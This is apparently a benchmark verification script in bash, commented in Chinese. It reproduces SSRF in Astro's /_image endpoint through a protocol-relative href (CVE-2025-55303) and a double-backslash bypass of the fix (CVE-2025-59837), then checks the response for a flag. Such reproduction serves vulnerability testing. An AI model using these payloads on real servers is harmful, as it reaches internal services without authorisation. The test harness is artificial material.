#!/usr/bin/env bash
# verify.sh --seed|--residual — astro-image-isremotepath（真实 Astro SSR / 外部 HTTP /_image SSRF）
#   seed     = CVE-2025-55303 原形：GET /_image?href=//internal-sidecar/flag（协议相对 URL），
#              v0(ih 0.7.1) isRemotePath 不识别 //host → 走非 remote 分支 → new URL('//…', origin) → SSRF 到 internal-sidecar → flag
#              v1(ih 0.7.2) 修复正则加入 // 分支 → 视为 remote → allowlist 强制 → 403（seed 被阻止）
#   residual = CVE-2025-59837 残留：href=\\internal-sidecar\flag（前导双反斜杠，URL 编码 %5C%5C），
#              v1 正则只匹配正斜杠 → isRemotePath=false → WHATWG URL 把 \\ 归一为 // → SSRF 仍达 sidecar → flag
#              v2(ih 0.7.3) 解码 %5C 后识别反斜杠 → 403（完整修复）
# 效果通道 = /_image HTTP 响应 body 出现 RUN_FLAG（sidecar 直接回显 ${PCB_FLAG}，noop 图片服务原样透传）
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

# 宿主端口：compose 固定映射 v0=39750 / v1=39751 -> 容器 8080（seed_exec.py 内部同一映射）
HOST_PORT=39750; [[ "$VERSION" == "v1" ]] && HOST_PORT=39751

# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
# 就绪探测：Astro 根路径 200（等待 standalone node server 起来）；动态端口优先，回退固定 HOST_PORT
READY_PORT="${PORT:-$HOST_PORT}"
"$PY" - "$READY_PORT" <<'PYEOF' || { echo "readiness probe failed on port $READY_PORT" >&2; exit 20; }
import sys, time, urllib.request
port = sys.argv[1]
deadline = time.time() + 90
while time.time() < deadline:
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF

# 候选：seed = 协议相对 //host；residual = 双反斜杠 \\host（seed_exec 的 urlencode 会编码为 %5C%5C…）
if [[ "$MODE" == "--seed" ]]; then
  CAND='{"id": "cve-2025-55303-protocol-relative", "href": "//internal-sidecar/flag"}'
else
  CAND='{"id": "cve-2025-59837-backslash", "href": "\\\\internal-sidecar\\flag"}'
fi
OUT="$(printf '%s' "$CAND" | "$PY" "$CASE_DIR/poc/seed_exec.py" /dev/stdin "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('fetched_body') or d.get('body') or '')
sys.exit(0 if '$RUN_FLAG' in body else 10)" "$OUT"
